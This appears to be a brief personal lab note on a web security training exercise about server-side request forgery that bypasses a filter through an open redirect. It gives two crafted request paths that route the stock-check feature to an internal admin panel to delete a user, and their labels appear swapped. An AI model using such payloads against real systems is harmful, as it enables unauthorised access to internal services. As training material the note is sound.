Lab #5 - SSRF with filter bypass via open redirection vulnerability

Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. 

Analysis:

admin page: /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos

delete user: /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/